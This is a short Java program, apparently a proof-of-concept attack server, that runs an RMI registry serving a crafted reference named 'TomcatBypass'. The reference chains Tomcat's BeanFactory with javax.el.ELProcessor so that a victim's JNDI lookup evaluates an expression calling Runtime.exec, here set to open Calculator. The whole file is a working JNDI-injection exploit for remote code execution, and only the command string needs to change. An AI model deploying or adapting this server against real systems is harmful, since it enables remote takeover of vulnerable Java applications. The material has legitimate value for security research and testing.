import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class HackerRmiServer {
    public static void main(String[] args) throws Exception {
        int rmiPort = 1099;
        Registry registry = LocateRegistry.createRegistry(rmiPort);
        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
        resourceRef.add(new StringRefAddr("forceString", "x=eval"));
        resourceRef.add(new StringRefAddr("x", "Runtime.getRuntime().exec(\"open -a Calculator.app\")"));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
        registry.bind("TomcatBypass", referenceWrapper);
        System.out.println(referenceWrapper.getReference());
        System.out.println("RMI Listening on: " + rmiPort);
    }
}